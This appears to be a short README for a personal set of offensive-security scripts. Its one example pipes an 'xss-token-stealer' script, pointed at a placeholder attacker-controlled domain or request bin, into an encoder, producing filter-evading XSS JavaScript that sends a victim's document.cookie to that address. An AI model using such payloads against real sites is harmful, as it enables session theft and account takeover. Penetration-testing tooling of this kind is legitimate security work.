# Tools

Random script and tools I made to avoid retyping it everytime.

## Examples:
Let's say you want to generate an XSS payload to steal an authentication cookie. You could do this:
```
./xss-token-stealer.py "https://<CONTROLLED DOMAIN NAME/REQUESTBIN>" | ./charcodify.py
```

This would issue a javascript code that avoids common bad character and exfiltrates the document.cookie to the specified address.
